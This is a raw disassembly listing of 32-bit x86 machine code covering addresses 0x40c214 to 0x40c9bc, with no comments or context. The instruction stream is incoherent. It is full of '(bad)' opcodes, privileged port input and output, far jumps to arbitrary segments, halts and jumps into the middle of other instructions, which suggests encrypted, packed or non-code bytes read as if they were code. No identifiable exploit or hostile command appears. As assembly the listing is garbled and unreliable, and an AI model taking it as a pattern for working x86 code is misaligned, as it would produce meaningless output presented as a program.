  40c214:	mov    al,ds:0xfa55d10f
  40c219:	mov    al,ds:0x8984141d
  40c21e:	(bad)  
  40c220:	dec    ebp
  40c221:	cmc    
  40c222:	xchg   edi,eax
  40c223:	dec    ebx
  40c224:	fld    TBYTE PTR [ebp+ebp*2+0x7e]
  40c228:	ds mov ebp,0x55059013
  40c22e:	push   ebx
  40c22f:	test   al,0xc9
  40c231:	cwde   
  40c232:	push   esi
  40c233:	(bad)  
  40c234:	pop    ecx
  40c235:	adc    DWORD PTR [ebx],0x2c850861
  40c23b:	mov    cl,0x1c
  40c23d:	pop    edx
  40c23e:	push   0x106993bc
  40c243:	popa   
  40c244:	enter  0xd96e,0x43
  40c248:	pop    edx
  40c249:	jmp    0x135ebcec
  40c24e:	add    esp,DWORD PTR [ebx-0x7e]
  40c251:	push   ecx
  40c252:	adc    ecx,DWORD PTR [esi-0x10eb3e9b]
  40c258:	jecxz  0x40c24c
  40c25a:	jnp    0x40c29c
  40c25c:	fistp  DWORD PTR [ebx]
  40c25e:	or     al,0xd3
  40c260:	rcr    DWORD PTR [esi],1
  40c262:	jns    0x40c276
  40c264:	pop    eax
  40c265:	mov    cl,0x32
  40c267:	adc    eax,0x713e6a53
  40c26c:	cmp    al,0x61
  40c26e:	imul   edx
  40c270:	retf   0xc061
  40c273:	lea    eax,[ebx+0x63]
  40c276:	add    al,0x73
  40c278:	mov    esi,0x53edadc5
  40c27d:	aaa    
  40c27e:	or     DWORD PTR [ebx-0x6d787fbf],ecx
  40c284:	xchg   BYTE PTR ds:0xb820f88c,ch
  40c28a:	mov    fs,WORD PTR [eax]
  40c28c:	not    DWORD PTR [ebp-0x6b]
  40c28f:	cmp    eax,0x31a83be
  40c294:	pop    ebx
  40c295:	pop    edi
  40c296:	mov    eax,ds:0xc6dd9fcd
  40c29b:	pmullw mm4,QWORD PTR [edi]
  40c29e:	push   ebp
  40c29f:	ds lahf 
  40c2a1:	jecxz  0x40c29a
  40c2a3:	scas   al,BYTE PTR es:[edi]
  40c2a4:	arpl   WORD PTR [ebx-0x5445000],sp
  40c2aa:	sbb    bl,BYTE PTR [esi-0x50]
  40c2ad:	cmp    eax,0x7c26651
  40c2b2:	imul   ebx,DWORD PTR [eax],0xffffff92
  40c2b5:	lock mov edi,?
  40c2b8:	aad    0xb7
  40c2ba:	pusha  
  40c2bb:	jnp    0x40c260
  40c2bd:	and    al,0x69
  40c2bf:	dec    DWORD PTR [ebx+0x54]
  40c2c2:	dec    ebp
  40c2c3:	inc    edx
  40c2c4:	ret    0x81b9
  40c2c7:	add    BYTE PTR [ebp-0x6617fd58],0x12
  40c2ce:	jge    0x40c271
  40c2d0:	xchg   ebx,eax
  40c2d1:	xor    BYTE PTR [edi],ah
  40c2d3:	outs   dx,DWORD PTR ds:[esi]
  40c2d4:	aaa    
  40c2d5:	sar    DWORD PTR [edi-0x198e9acc],1
  40c2db:	stos   BYTE PTR es:[edi],al
  40c2dc:	sub    eax,0x3eb0eb79
  40c2e1:	mov    edx,DWORD PTR [ecx]
  40c2e3:	inc    ecx
  40c2e4:	in     al,0xdf
  40c2e6:	in     eax,dx
  40c2e7:	fidiv  WORD PTR ds:0xd95aca5d
  40c2ed:	and    DWORD PTR [edx],0xffffffaf
  40c2f0:	inc    eax
  40c2f1:	push   eax
  40c2f2:	sar    DWORD PTR [ebp+0x7b6b4b3c],1
  40c2f8:	pop    esi
  40c2f9:	push   ebx
  40c2fa:	rol    DWORD PTR [ecx+eiz*8],0xd2
  40c2fe:	cmp    cl,dl
  40c300:	inc    ebx
  40c301:	shr    ebx,cl
  40c303:	in     al,0x70
  40c305:	xchg   DWORD PTR [ecx+0x62],esp
  40c308:	push   edx
  40c309:	loop   0x40c2be
  40c30b:	sbb    eax,0x43f9a3db
  40c310:	lds    edi,FWORD PTR ds:0x2b7307c7
  40c317:	cdq    
  40c318:	pop    ebp
  40c319:	push   edx
  40c31a:	xchg   edx,eax
  40c31b:	ins    BYTE PTR es:[edi],dx
  40c31c:	push   dx
  40c31e:	push   ds
  40c31f:	lahf   
  40c320:	push   ebp
  40c321:	gs je  0x40c38d
  40c324:	mov    ecx,0xf0c0c43b
  40c329:	sbb    ebx,DWORD PTR [ebx-0x4b]
  40c32c:	mov    ch,0xe
  40c32e:	xchg   esi,eax
  40c32f:	jnp    0x40c39d
  40c331:	call   0x60f9:0x23f57f7b
  40c338:	test   al,0x3f
  40c33a:	sbb    edx,edx
  40c33c:	add    bl,BYTE PTR [ecx-0x792ac591]
  40c342:	cmp    eax,DWORD PTR [edx-0x193ea05b]
  40c348:	sahf   
  40c349:	sti    
  40c34a:	push   0xffffffc5
  40c34c:	sub    BYTE PTR [ebx-0x9],bl
  40c34f:	sub    eax,0xff850b4f
  40c354:	ins    DWORD PTR es:[edi],dx
  40c355:	outs   dx,DWORD PTR ds:[esi]
  40c356:	add    ebp,ebp
  40c358:	cwde   
  40c359:	daa    
  40c35a:	adc    BYTE PTR [edx],al
  40c35c:	mov    edx,0xdf303a80
  40c361:	inc    ecx
  40c362:	xchg   DWORD PTR [edx+0x1505e5c],ecx
  40c368:	cmp    ch,dl
  40c36a:	inc    esi
  40c36b:	push   esp
  40c36c:	inc    ebp
  40c36d:	jl     0x40c3a5
  40c36f:	or     esi,ecx
  40c371:	xchg   esi,eax
  40c372:	sti    
  40c373:	ret    
  40c374:	cli    
  40c375:	adc    al,0x39
  40c377:	lods   al,BYTE PTR ds:[esi]
  40c378:	(bad)  
  40c379:	dec    ebp
  40c37a:	pop    ebx
  40c37b:	dec    esi
  40c37c:	arpl   cx,bx
  40c37e:	(bad)  
  40c381:	sub    BYTE PTR [edi+0x28c2957a],ah
  40c387:	xchg   ebp,eax
  40c388:	xor    DWORD PTR [eax],ebx
  40c38a:	imul   esp,esp,0xf81ee3ac
  40c390:	sub    eax,0xffffffaf
  40c393:	jl     0x40c3dc
  40c395:	stos   DWORD PTR es:[edi],eax
  40c396:	sbb    al,0xa0
  40c398:	push   esp
  40c399:	call   0xc813:0xc269ab3a
  40c3a0:	inc    edi
  40c3a1:	fnstcw WORD PTR [edi-0x15]
  40c3a4:	xchg   ecx,eax
  40c3a5:	sbb    al,0xd8
  40c3a7:	add    ebp,ecx
  40c3a9:	pop    esp
  40c3aa:	xor    DWORD PTR [edx+ebp*8],esp
  40c3ad:	bound  ebx,QWORD PTR [edi-0x6c1e17e1]
  40c3b3:	jmp    0xa95d:0x3ba6c1a2
  40c3ba:	scas   al,BYTE PTR es:[edi]
  40c3bb:	cmp    al,0xae
  40c3bd:	nop
  40c3be:	ds mov edx,0xfe03f995
  40c3c4:	xor    DWORD PTR [ecx],ebp
  40c3c6:	inc    ebx
  40c3c7:	mov    esi,0x9314009b
  40c3cc:	ret    0xdd1f
  40c3cf:	hlt    
  40c3d0:	(bad)  
  40c3d1:	fwait
  40c3d2:	cmp    dl,BYTE PTR [edx+eax*2+0x1e]
  40c3d6:	jge    0x40c394
  40c3d8:	pop    esp
  40c3d9:	or     edi,DWORD PTR [eax-0x181635f6]
  40c3df:	shl    ah,1
  40c3e1:	fwait
  40c3e2:	xor    eax,0x9e3efe6c
  40c3e7:	pushf  
  40c3e8:	inc    eax
  40c3e9:	xchg   esi,eax
  40c3ea:	cld    
  40c3eb:	push   edx
  40c3ec:	inc    esp
  40c3ed:	int    0x81
  40c3ef:	loope  0x40c447
  40c3f1:	mov    eax,0xacbe3f13
  40c3f6:	push   esi
  40c3f7:	mov    ah,0x7
  40c3f9:	mov    esi,ecx
  40c3fb:	inc    DWORD PTR [ebx+ebp*8+0x1ee901da]
  40c402:	mov    ebp,0x8f076bc
  40c407:	push   cs
  40c408:	pop    ebx
  40c409:	push   0xffffffaf
  40c40b:	aas    
  40c40c:	cmp    DWORD PTR [esi+0x579225e1],esi
  40c412:	daa    
  40c413:	sbb    dh,al
  40c415:	xor    ecx,DWORD PTR [ebx+0x31bb614d]
  40c41b:	pushf  
  40c41c:	aas    
  40c41d:	or     eax,0x7fdf966b
  40c422:	out    dx,eax
  40c423:	jmp    0x6ba309d1
  40c428:	in     al,dx
  40c429:	inc    esp
  40c42a:	jb     0x40c446
  40c42c:	pop    eax
  40c42d:	es stc 
  40c42f:	stos   DWORD PTR es:[edi],eax
  40c430:	push   0xf26de86c
  40c435:	cmp    BYTE PTR [edx+0x2b651447],0xd1
  40c43c:	sti    
  40c43d:	dec    ecx
  40c43e:	pop    ds
  40c43f:	jmp    0x40c48b
  40c441:	loop   0x40c468
  40c443:	pop    edx
  40c444:	adc    edx,esp
  40c446:	retf   
  40c447:	add    DWORD PTR [esi],edi
  40c449:	jb     0x40c446
  40c44b:	mov    bh,al
  40c44d:	fistp  DWORD PTR [edi-0x2a]
  40c450:	add    al,cl
  40c452:	push   0x75
  40c454:	out    dx,al
  40c455:	mov    ch,0xf2
  40c457:	sub    DWORD PTR [ebx-0x3fadc13c],eax
  40c45d:	xlat   BYTE PTR ds:[ebx]
  40c45e:	push   ss
  40c45f:	push   ss
  40c460:	arpl   WORD PTR [ecx],di
  40c462:	mov    ds:0xa83087ff,al
  40c467:	out    dx,eax
  40c468:	(bad)  
  40c469:	test   al,0xe0
  40c46b:	fdiv   QWORD PTR [esi-0x74]
  40c46e:	or     bl,BYTE PTR [ebx]
  40c470:	cmp    bh,0xdd
  40c473:	test   DWORD PTR [ebx-0x65],edi
  40c476:	add    eax,0x8ebbcccc
  40c47b:	out    0x4,eax
  40c47d:	cli    
  40c47e:	xchg   ebx,eax
  40c47f:	jnp    0x40c41e
  40c481:	(bad)  
  40c482:	jg     0x40c41a
  40c484:	leave  
  40c485:	pop    es
  40c486:	mov    cl,0x3d
  40c488:	adc    esi,DWORD PTR [esi+0x4029c543]
  40c48e:	fidiv  DWORD PTR [ebx+0x6f8406a1]
  40c494:	data16 int 0xe
  40c497:	adc    DWORD PTR [ebx-0x6303cdef],ebx
  40c49d:	sahf   
  40c49e:	jecxz  0x40c49b
  40c4a0:	jne    0x40c4a3
  40c4a2:	daa    
  40c4a3:	popa   
  40c4a4:	lock mov edx,0xe27f10d3
  40c4aa:	fld    st(1)
  40c4ac:	arpl   WORD PTR ds:0xe5bde0ec,si
  40c4b2:	sti    
  40c4b3:	sub    al,0x20
  40c4b5:	test   DWORD PTR [esi],ebx
  40c4b7:	lock cmp ebx,0xfe742ffc
  40c4be:	push   ds
  40c4bf:	imul   ebp,DWORD PTR [edi+edi*4+0x2a],0xffffffb4
  40c4c4:	mov    BYTE PTR [ecx],al
  40c4c6:	fistp  WORD PTR [edx]
  40c4c8:	jecxz  0x40c4d0
  40c4ca:	in     eax,0x6a
  40c4cc:	pop    esp
  40c4cd:	enter  0x2357,0x4b
  40c4d1:	popa   
  40c4d2:	pop    esp
  40c4d3:	out    dx,al
  40c4d4:	adc    BYTE PTR [eax+0x4a],al
  40c4d7:	inc    ecx
  40c4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d9:	inc    esp
  40c4da:	mov    DWORD PTR [edi-0x9c729f8],edx
  40c4e0:	lea    edx,[edx]
  40c4e2:	xchg   DWORD PTR [ecx-0x2c],edx
  40c4e5:	sbb    dl,cl
  40c4e7:	push   ecx
  40c4e8:	xor    edi,eax
  40c4ea:	das    
  40c4eb:	ror    BYTE PTR [esi+0x79],1
  40c4ee:	mov    cl,0x52
  40c4f0:	mov    cl,0x5b
  40c4f2:	and    cl,BYTE PTR [edi+0x40]
  40c4f5:	daa    
  40c4f6:	dec    esp
  40c4f7:	lods   eax,DWORD PTR ds:[esi]
  40c4f8:	cmp    DWORD PTR [edi-0x30],0x1948d227
  40c4ff:	fcom   QWORD PTR [ecx]
  40c501:	imul   esi,esi,0x91d937a2
  40c507:	or     eax,0x643427b5
  40c50c:	ds (bad) 
  40c50e:	fstp   st(7)
  40c510:	or     ecx,DWORD PTR [esi]
  40c512:	dec    edx
  40c513:	mov    WORD PTR [ebx+eax*1-0x6e],?
  40c517:	jl     0x40c4b4
  40c519:	jge    0x40c58a
  40c51b:	jo     0x40c4ab
  40c51d:	xor    esp,eax
  40c51f:	mov    ds:0xe7c03596,eax
  40c524:	dec    ecx
  40c525:	add    al,0x8b
  40c527:	inc    esp
  40c528:	xor    BYTE PTR [ebx+0x7dfe829a],dl
  40c52e:	ins    DWORD PTR es:[edi],dx
  40c52f:	sbb    eax,0x75b398d1
  40c534:	repz mov ebx,0x1f7f3049
  40c53a:	push   edx
  40c53b:	aas    
  40c53c:	fmul   QWORD PTR [edi+0x4dc6bd3]
  40c542:	xor    DWORD PTR [ebx-0x330bdc9f],edi
  40c548:	xor    BYTE PTR [eax-0x586816be],0xbe
  40c54f:	aas    
  40c550:	dec    edx
  40c551:	dec    eax
  40c552:	arpl   di,ax
  40c554:	pop    es
  40c555:	cli    
  40c556:	push   0x47
  40c558:	mov    eax,ds:0xb3b6c52f
  40c55d:	mov    dh,0x3e
  40c55f:	js     0x40c584
  40c561:	iret   
  40c562:	inc    ebx
  40c563:	aad    0xa
  40c565:	int    0x7d
  40c567:	mov    dl,0x59
  40c569:	jmp    0x40c5ab
  40c56b:	pop    es
  40c56c:	dec    eax
  40c56d:	add    BYTE PTR [ebx+edx*8+0xc1fef74],ch
  40c574:	imul   cx,WORD PTR [ebx],0x3df
  40c579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c57a:	mul    DWORD PTR [ecx+0x6fa4af8e]
  40c580:	sub    al,cl
  40c582:	repnz add BYTE PTR [ebx],dl
  40c585:	xor    al,0xcc
  40c587:	test   bl,ah
  40c589:	out    dx,al
  40c58a:	ja     0x40c560
  40c58c:	imul   ebp,DWORD PTR [eax-0x49880436],0xc575df3c
  40c596:	inc    ecx
  40c597:	mov    ebx,0x5a20e6a
  40c59c:	fs xor esi,0xa6bcc210
  40c5a3:	fdivr  DWORD PTR [eax-0xaddc426]
  40c5a9:	dec    edx
  40c5aa:	adc    dx,WORD PTR [ecx+0x7cb65ab5]
  40c5b1:	aam    0x2a
  40c5b3:	jb     0x40c61b
  40c5b5:	mov    ebp,0x7fe268df
  40c5ba:	jnp    0x40c5dc
  40c5bc:	jno    0x40c540
  40c5be:	cs mov edi,0x9085909d
  40c5c4:	mov    ch,0x63
  40c5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5c7:	int    0x89
  40c5c9:	les    esi,FWORD PTR [edx-0x21]
  40c5cc:	ds push edx
  40c5ce:	xchg   esi,eax
  40c5cf:	adc    cl,BYTE PTR fs:[edi-0x3d3ef6b9]
  40c5d6:	mov    bh,0x2d
  40c5d8:	popf   
  40c5d9:	(bad)  
  40c5da:	aad    0x6f
  40c5dc:	sub    al,0xa7
  40c5de:	pop    ecx
  40c5df:	add    dl,BYTE PTR [esi]
  40c5e1:	xchg   ebp,eax
  40c5e2:	add    BYTE PTR [ebp+0x41],al
  40c5e5:	pop    esi
  40c5e6:	js     0x40c56f
  40c5e8:	scas   eax,DWORD PTR es:[edi]
  40c5e9:	ret    
  40c5ea:	pop    es
  40c5eb:	(bad)  
  40c5ec:	push   DWORD PTR [edi-0x4c]
  40c5ef:	sbb    al,0x6c
  40c5f1:	pop    edx
  40c5f2:	inc    edi
  40c5f3:	popw   ss
  40c5f5:	xchg   BYTE PTR [ebp+esi*8+0x6bee62b7],dl
  40c5fc:	xchg   edx,eax
  40c5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5fe:	in     eax,0x55
  40c600:	into   
  40c601:	mov    bl,0x26
  40c603:	(bad)  
  40c605:	jne    0x40c668
  40c607:	into   
  40c608:	mov    bl,0x27
  40c60a:	in     eax,0x73
  40c60c:	popa   
  40c60d:	or     al,0x0
  40c60f:	cmp    eax,0xf29c256e
  40c614:	pop    esp
  40c615:	mov    ebp,0xe831cbbe
  40c61a:	push   0xfb1f7281
  40c61f:	imul   ebp,DWORD PTR [eax+eax*8-0x6473b258],0x71
  40c627:	fnstenv [ebx+0x6b833845]
  40c62d:	ds inc ebp
  40c62f:	xor    eax,0xa6cbd825
  40c634:	fst    DWORD PTR [ebp+eax*1-0x758f409a]
  40c63b:	scas   al,BYTE PTR es:[edi]
  40c63c:	mov    esi,0xd13e87b3
  40c641:	mov    eax,ds:0x212d5528
  40c646:	sbb    edi,DWORD PTR [esp+edi*4+0x69]
  40c64a:	cld    
  40c64b:	adc    cl,ah
  40c64d:	pop    es
  40c64e:	xor    BYTE PTR [edi+0x1ab11230],al
  40c654:	popf   
  40c655:	data16 fcmovne st,st(4)
  40c658:	xor    DWORD PTR [ebp+0x63],0xaba2eef
  40c65f:	aaa    
  40c660:	dec    edi
  40c661:	xor    bh,ah
  40c663:	(bad)  
  40c664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c665:	imul   ebp,ebx,0x46
  40c668:	js     0x40c663
  40c66a:	ret    
  40c66b:	idiv   DWORD PTR ds:0xcbf2c148
  40c671:	xor    BYTE PTR [esi],0xd5
  40c674:	jnp    0x40c6c5
  40c676:	imul   DWORD PTR [edi+esi*1-0x769de5d3]
  40c67d:	es test al,0x64
  40c680:	mov    dh,0x10
  40c682:	dec    eax
  40c683:	cmp    cl,BYTE PTR [edx+0x4a09522d]
  40c689:	jnp    0x40c647
  40c68b:	push   es
  40c68c:	retf   0x5130
  40c68f:	sub    DWORD PTR [ecx+0x61243447],ecx
  40c695:	hlt    
  40c696:	inc    eax
  40c697:	jp     0x40c6f3
  40c699:	daa    
  40c69a:	mov    dl,0x3b
  40c69c:	mov    edx,0xe1d9f777
  40c6a1:	dec    edx
  40c6a2:	mov    cl,0x61
  40c6a4:	xchg   ebp,eax
  40c6a5:	outs   dx,DWORD PTR ds:[esi]
  40c6a6:	or     BYTE PTR [edx+0x67eaac7f],0x8e
  40c6ad:	xchg   esp,eax
  40c6ae:	gs gs stos BYTE PTR es:[edi],al
  40c6b1:	xchg   ecx,eax
  40c6b2:	outs   dx,DWORD PTR ds:[esi]
  40c6b3:	adc    eax,0x287f0086
  40c6b8:	ror    DWORD PTR [edi],1
  40c6ba:	xchg   DWORD PTR [ebp-0x78edba6e],edi
  40c6c0:	shl    DWORD PTR [esi+0x2a],0x8b
  40c6c4:	sbb    ebx,ecx
  40c6c6:	js     0x40c6a0
  40c6c8:	push   eax
  40c6c9:	out    dx,eax
  40c6ca:	dec    eax
  40c6cb:	sti    
  40c6cc:	push   esi
  40c6cd:	clc    
  40c6ce:	pop    eax
  40c6cf:	add    BYTE PTR ds:0xb213dd5e,ch
  40c6d5:	xchg   BYTE PTR [ecx+0x7f],ch
  40c6d8:	xchg   edx,eax
  40c6d9:	xchg   edx,ebp
  40c6db:	add    DWORD PTR [esi-0x6fa711fa],eax
  40c6e1:	jno    0x40c75c
  40c6e3:	int3   
  40c6e4:	jmp    0xd07911d9
  40c6e9:	jmp    0x44e8:0xb5a9d3ca
  40c6f0:	inc    esi
  40c6f1:	fnstcw WORD PTR [esi]
  40c6f3:	or     eax,0xa7b2a7ee
  40c6f8:	xchg   edi,eax
  40c6f9:	xor    ebx,ebp
  40c6fb:	mov    eax,ds:0xcafd8139
  40c700:	nop
  40c701:	mov    bl,0x3e
  40c703:	sti    
  40c704:	scas   eax,DWORD PTR es:[edi]
  40c705:	out    0x14,eax
  40c707:	adc    BYTE PTR [edi],0xa2
  40c70a:	pop    ebx
  40c70b:	daa    
  40c70c:	push   es
  40c70d:	mov    WORD PTR [edx+0x2fb89fea],gs
  40c713:	(bad)  
  40c714:	hlt    
  40c715:	add    cl,BYTE PTR [edi+0x74b39ce0]
  40c71b:	jl     0x40c79b
  40c71d:	jns    0x40c6d9
  40c71f:	mov    ecx,0x57dee4ae
  40c724:	in     al,0xc9
  40c726:	or     eax,esp
  40c728:	mov    ebx,0xd11a4a98
  40c72d:	cmp    ebp,ebp
  40c72f:	xchg   ebp,eax
  40c730:	and    dh,BYTE PTR ds:0x8a9e997e
  40c736:	cmp    edi,ebx
  40c738:	leave  
  40c739:	pop    esi
  40c73a:	cmp    esp,eax
  40c73c:	mov    edi,0x5ceab20
  40c741:	pop    ecx
  40c742:	and    DWORD PTR [ecx],ebp
  40c744:	lock popf 
  40c746:	pop    eax
  40c747:	dec    eax
  40c748:	mov    ah,0xe8
  40c74a:	xor    ch,cl
  40c74c:	sti    
  40c74d:	add    al,0x68
  40c74f:	pop    ebx
  40c750:	icebp  
  40c751:	push   ebp
  40c752:	dec    ebx
  40c753:	xchg   ecx,eax
  40c754:	fwait
  40c755:	push   ss
  40c756:	shr    BYTE PTR [edx+ecx*4-0x706d1d87],1
  40c75d:	mov    al,0xe3
  40c75f:	stc    
  40c760:	int3   
  40c761:	xchg   edi,eax
  40c762:	je     0x40c6f4
  40c764:	mov    DWORD PTR [ebp+0x4b0c0bf6],edx
  40c76a:	xor    BYTE PTR [eax-0x3d],bh
  40c76d:	push   ds
  40c76e:	jb     0x40c727
  40c770:	test   eax,0x95a463b7
  40c775:	fnsave [edi+0x17]
  40c778:	jg     0x40c7b6
  40c77a:	in     eax,dx
  40c77b:	arpl   WORD PTR [edx-0x1b26af6f],ax
  40c781:	mov    WORD PTR [ebx],ds
  40c783:	inc    ebp
  40c784:	into   
  40c785:	scas   eax,DWORD PTR es:[edi]
  40c786:	rcr    DWORD PTR [eax+0x77],0x55
  40c78a:	popf   
  40c78b:	pop    ebx
  40c78c:	data16 rol BYTE PTR [eax-0x70],0x71
  40c791:	jp     0x40c72c
  40c793:	ror    BYTE PTR [eax-0x5b],0x83
  40c797:	stos   DWORD PTR es:[edi],eax
  40c798:	std    
  40c799:	fisttp QWORD PTR gs:[edx-0x40]
  40c79d:	fld    TBYTE PTR [ebx+0x3c]
  40c7a0:	mov    ebp,0x847a261f
  40c7a5:	repnz cdq 
  40c7a7:	jecxz  0x40c807
  40c7a9:	bound  esp,QWORD PTR [ebp-0x5bfde1b6]
  40c7af:	cwde   
  40c7b0:	add    esp,DWORD PTR [ebx+0x21889f30]
  40c7b6:	push   0xfa6652dd
  40c7bb:	ja     0x40c82d
  40c7bd:	add    DWORD PTR [edx-0x4d39116d],ebp
  40c7c3:	xor    DWORD PTR [ecx],0xffffffa3
  40c7c6:	in     eax,dx
  40c7c7:	ins    BYTE PTR es:[edi],dx
  40c7c8:	jl     0x40c7f4
  40c7ca:	dec    ebx
  40c7cb:	mov    al,ds:0x61b8b762
  40c7d0:	call   0xb63c:0xafb47b2c
  40c7d7:	(bad)  
  40c7d8:	(bad)  
  40c7d9:	in     al,0x77
  40c7db:	nop
  40c7dc:	movntps XMMWORD PTR [ebp+ecx*8+0x78],xmm0
  40c7e1:	jmp    0x40c859
  40c7e3:	and    eax,edx
  40c7e5:	xor    al,0xe9
  40c7e7:	cmc    
  40c7e8:	push   ebx
  40c7e9:	jns    0x40c7da
  40c7eb:	mov    ah,0x30
  40c7ed:	add    al,0x91
  40c7ef:	loop   0x40c824
  40c7f1:	mov    BYTE PTR [ebx+0x6b66377c],bl
  40c7f7:	lock sub bl,BYTE PTR [ecx-0xd]
  40c7fb:	mov    ds:0xd05b2bf,eax
  40c800:	pop    ebx
  40c801:	adc    DWORD PTR [ecx],0xf40e840c
  40c807:	sub    esp,DWORD PTR [eax-0x61579526]
  40c80d:	imul   esp,esi,0x4c45cf1f
  40c813:	gs imul esi,ecx,0x6a
  40c817:	frstor [eax-0x47]
  40c81a:	sub    bh,BYTE PTR [eax]
  40c81c:	sub    BYTE PTR [edx-0x24],dh
  40c81f:	test   DWORD PTR [edx+0x26],edx
  40c822:	jb     0x40c7b2
  40c824:	rcl    DWORD PTR [esi+edi*2],cl
  40c827:	mov    esi,0x60069626
  40c82c:	jmp    0x40c816
  40c82e:	fcom   QWORD PTR [ebp+0x59]
  40c831:	jmp    0xf413:0x5872488e
  40c838:	retf   
  40c839:	ins    BYTE PTR es:[edi],dx
  40c83a:	mov    ds:0xb2fdef5b,al
  40c83f:	mov    ch,0xc1
  40c841:	mov    al,0xd9
  40c843:	inc    ecx
  40c844:	xchg   ecx,eax
  40c845:	inc    ebp
  40c846:	fs out 0xab,eax
  40c849:	jnp    0x40c81a
  40c84b:	mov    ds:0x269d6e17,al
  40c850:	sub    eax,0xa67ddd61
  40c856:	push   esi
  40c857:	add    al,0x95
  40c859:	loope  0x40c8d9
  40c85b:	mov    ebp,0x9a6468b
  40c860:	or     al,0xa2
  40c862:	cli    
  40c863:	adc    DWORD PTR [edx],ebx
  40c865:	fstp   DWORD PTR [esi+edi*8]
  40c868:	pushf  
  40c869:	push   fs
  40c86b:	in     al,dx
  40c86c:	mov    edi,0x7f49dbb4
  40c871:	mov    dl,BYTE PTR [edi+ecx*1]
  40c874:	repz inc edx
  40c876:	in     eax,0xbb
  40c878:	mov    dl,ah
  40c87a:	or     al,0x15
  40c87c:	in     eax,0xb4
  40c87e:	push   edx
  40c87f:	pop    eax
  40c880:	xchg   BYTE PTR [edi],ch
  40c882:	xor    DWORD PTR [eax],esi
  40c884:	cld    
  40c885:	arpl   di,bx
  40c887:	inc    ebp
  40c888:	test   al,0x8f
  40c88a:	xlat   BYTE PTR ds:[ebx]
  40c88b:	xchg   esp,eax
  40c88c:	mov    ebp,0xcffbfc0a
  40c891:	and    DWORD PTR [ecx+0x7f],esp
  40c894:	fadd   QWORD PTR [ecx-0x33]
  40c897:	sti    
  40c898:	mov    ecx,DWORD PTR [esp+esi*1]
  40c89b:	ja     0x40c8db
  40c89d:	adc    al,0x64
  40c89f:	stc    
  40c8a0:	jg     0x40c889
  40c8a2:	gs xor eax,0xfcf92d4a
  40c8a8:	(bad)  
  40c8a9:	in     al,0xde
  40c8ab:	repnz mov eax,ds:0x63fe8b2
  40c8b1:	push   edx
  40c8b2:	xor    BYTE PTR [ebx],bh
  40c8b4:	push   edx
  40c8b5:	sbb    al,BYTE PTR fs:[esi]
  40c8b8:	sub    bl,dl
  40c8ba:	jg     0x40c89d
  40c8bc:	shl    BYTE PTR [ecx+0x3b],cl
  40c8bf:	mov    ds:0x527d1ae1,eax
  40c8c4:	sub    dl,dh
  40c8c6:	and    BYTE PTR [edx+0x32],ah
  40c8c9:	(bad)
  40c8ce:	and    al,0x11
  40c8d0:	ja     0x40c942
  40c8d2:	sbb    BYTE PTR [edx],ah
  40c8d4:	pop    esi
  40c8d5:	mov    WORD PTR [ecx],es
  40c8d7:	(bad)  
  40c8d8:	pop    eax
  40c8d9:	xchg   ebp,eax
  40c8da:	xchg   esi,eax
  40c8db:	test   DWORD PTR ds:0x579212eb,ecx
  40c8e1:	add    BYTE PTR ds:0x6331826d,cl
  40c8e7:	cmc    
  40c8e8:	scas   al,BYTE PTR es:[edi]
  40c8e9:	add    edx,DWORD PTR [esi+0x11]
  40c8ec:	push   esp
  40c8ed:	and    eax,0x72320147
  40c8f2:	xchg   DWORD PTR [ecx],ecx
  40c8f4:	adc    DWORD PTR [edx],ebp
  40c8f6:	test   ecx,esi
  40c8f8:	lods   al,BYTE PTR ds:[esi]
  40c8f9:	aad    0x5d
  40c8fb:	(bad)  
  40c8fc:	jb     0x40c8b5
  40c8fe:	cmp    ah,BYTE PTR [edx+eax*4-0x3d]
  40c902:	imul   ebx,eax,0x3fbe9f1c
  40c908:	out    dx,eax
  40c909:	push   edx
  40c90a:	xor    ch,BYTE PTR [edx]
  40c90c:	or     dh,BYTE PTR ds:0x95dc92dc
  40c912:	aas    
  40c913:	inc    ecx
  40c914:	sbb    BYTE PTR [edx-0x66],bh
  40c917:	cmp    eax,edi
  40c919:	jle    0x40c93e
  40c91b:	aad    0x5d
  40c91d:	inc    edx
  40c91e:	sub    cl,ch
  40c920:	cmp    esp,DWORD PTR [ebx+eax*8-0x58afddae]
  40c927:	mov    ds:0xc80ded16,al
  40c92c:	xchg   ebp,eax
  40c92d:	out    dx,eax
  40c92e:	nop
  40c92f:	add    DWORD PTR [edi+eax*2],ebp
  40c932:	mov    eax,ds:0x65277118
  40c937:	imul   DWORD PTR [ebp-0x209a7250]
  40c93d:	cmp    bh,0xa
  40c940:	or     al,0xc8
  40c942:	cmp    al,BYTE PTR ds:0xb94a8dd8
  40c948:	not    DWORD PTR [ecx]
  40c94a:	adc    BYTE PTR [esi-0x20],dh
  40c94d:	dec    esp
  40c94e:	pop    esi
  40c94f:	mov    esi,0x97a6b676
  40c954:	stc    
  40c955:	test   BYTE PTR [ebx],0x32
  40c958:	imul   esp,edi,0x7313d3f4
  40c95e:	push   ds
  40c95f:	inc    edi
  40c960:	icebp  
  40c961:	jp     0x40c9d8
  40c963:	data16 cmp al,cl
  40c966:	add    ah,BYTE PTR [esi+0x75]
  40c969:	sub    al,0xe7
  40c96b:	cld    
  40c96c:	mov    cl,BYTE PTR [edx+0x61]
  40c96f:	pop    eax
  40c970:	adc    BYTE PTR [eax],cl
  40c972:	repnz mov eax,ds:0x6024129e
  40c978:	jo     0x40c9ba
  40c97a:	fnstenv [esi-0x10]
  40c97d:	adc    dh,BYTE PTR [edx]
  40c97f:	pop    es
  40c980:	fcmovb st,st(4)
  40c982:	push   esp
  40c983:	nop
  40c984:	pushf  
  40c985:	mov    cl,BYTE PTR ds:0x51d3a648
  40c98b:	jb     0x40c942
  40c98d:	xor    dl,0xc2
  40c990:	sbb    DWORD PTR [ecx-0x10937f01],ebx
  40c996:	jmp    0xfa479129
  40c99b:	sbb    DWORD PTR [edi+0x47],0x59d7ca6b
  40c9a2:	loop   0x40c9a9
  40c9a4:	rol    ch,1
  40c9a6:	push   cs
  40c9a7:	mov    edx,0xea953851
  40c9ac:	sub    edi,DWORD PTR [edi+ecx*8-0x53]
  40c9b0:	not    DWORD PTR [ecx]
  40c9b2:	imul   ebp,DWORD PTR [edx],0x6f4679ba
  40c9b8:	out    0xb5,al
  40c9ba:	loop   0x40c97f
  40c9bc:	enter  0xee82,0x16
